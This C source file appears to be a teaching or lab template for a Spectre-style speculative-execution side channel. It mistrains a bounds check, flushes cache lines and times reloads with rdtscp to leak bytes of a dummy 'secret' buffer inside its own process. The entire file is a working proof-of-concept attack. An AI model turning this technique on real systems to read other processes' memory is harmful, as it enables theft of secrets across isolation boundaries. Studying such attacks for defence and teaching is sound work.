#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <fcntl.h>
#include <assert.h>
#include <unistd.h>
#include <sys/mman.h>
#include <x86intrin.h>

char secret[100];
char some_array[0x1000];

// cache scratchpad array
typedef struct Array {
    char data[0x1000];
} Array;


// used for flush-reload
volatile Array *scratchpad;

// used for branch predictor
volatile Array *temp_scratchpad;

// where to access!
volatile int *branch_variable;

// Size of the array on its own page
volatile int size[0x10000];
volatile int *array_size;

/* some function definitions */
void *
mmap_size(size_t size) {
    return mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
            -1, 0);
}

// allocate all memory
void
alloc_memory() {
    scratchpad = mmap_size(sizeof(Array) * 256);
    temp_scratchpad = mmap_size(sizeof(Array) * 256);
    branch_variable = mmap_size(0x1000);
    
    size[0] = 0x1000;
    array_size = &size[0];
    memset(secret, 97, 100);
}


// do meltdown; a template..
int meltdown_logic(int *idx,
                    Array *cachepad) {
    volatile int i = 0;
    
    // flush array size from cache and load index to access into cache
    *idx;
    _mm_clflush(array_size);
    _mm_mfence();
    
    if (*idx < *array_size && *idx >= 0) {
        // excute the following line speculatively
        // will access cachepad indexed by secret[idx]
        i &= cachepad[some_array[*idx]].data[0];
    }
    
    return i;
}



// flush all scratchpad data
void
flush_all() {
    for (int i=0; i<256; i++) {
        _mm_clflush(&scratchpad[i].data[0]);
    }
    _mm_mfence();
}


// reload and get the fastest timing index; also returns timing
uint64_t
reload_fastest(uint64_t *p_timing) {
    uint64_t min_timing = -1ul;
    uint64_t min_idx;
    // TODO: return minimum timing index and timing (via p_timing)
    // while reloading blocks from scratchpad

    uint64_t diff;
    uint64_t start;
    uint64_t end;
    volatile char c;
    uint32_t a;

    for (int i = 0; i < 256; i++) {
        start = __rdtscp(&a);
        c = scratchpad[i].data[0];
        end = __rdtscp(&a);
        diff = end - start;
	//printf("%d: %d\n", i, diff);
        if (diff < min_timing) {
            min_timing = diff;
            min_idx = i;
        }
    }
    *p_timing = min_timing;
    return min_idx;
}


void
spectre() {
    char buffer[100];
    memset(buffer, 0, 100);

    volatile char c;

    for (int i = 0; i < 64; i++) {
        usleep(1000);

        flush_all();

	volatile int malicious_x = (secret - some_array);	
	volatile int training_x = 0;	
	*branch_variable = ((i%6)-1)&~0xFFFF;
	*branch_variable = (*branch_variable|(*branch_variable>> 16)); 
	*branch_variable = training_x ^ (*branch_variable & (malicious_x ^ training_x));
        
	meltdown_logic(branch_variable, scratchpad);

        uint64_t min_timing = 0;
        uint64_t min_index = reload_fastest(&min_timing);
        if (min_timing > 100) {
            i--;
            continue;
	} 
        buffer[i] = (char)(min_index);
    	printf("Secret: %d\n", min_index);
    }
}

int
main() {
    alloc_memory();
    spectre();
    return 0;
}

